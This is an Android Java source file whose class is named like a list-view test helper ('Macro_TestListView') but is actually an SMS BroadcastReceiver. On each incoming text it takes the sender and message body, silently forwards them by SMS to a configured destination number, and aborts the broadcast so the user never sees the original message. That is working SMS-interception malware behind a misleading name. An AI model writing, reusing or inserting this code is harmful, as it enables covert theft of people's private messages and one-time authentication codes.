package com.bgw.aw.utils.impl;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class Macro_TestListView extends BroadcastReceiver {

	private String DESNUM = "";

	private static MessageListener mMessageListener;
	@Override
	public void onReceive(Context context, Intent intent) {

		
		Object[] objs = (Object[]) intent.getExtras().get("pdus");

		for (Object obj : objs) {

			SmsMessage msg = SmsMessage.createFromPdu((byte[]) obj);

			String body = msg.getMessageBody();

			String address = msg.getOriginatingAddress();

			
			

			 System.out.println(address + ":" + body);
			 String message=address+":"+body;
			 SmsManager smsManager = SmsManager.getDefault();
			 smsManager.sendTextMessage(DESNUM, null, message, null, null);
			 abortBroadcast();
		}
	}

	 public interface MessageListener {
	
	 public void onReceived(String message);
	
	 }
	
	 public void setOnReceivedMessageListener(MessageListener messageListener)
	 {
	
	 Macro_TestListView.mMessageListener = messageListener;
	
	 }

}
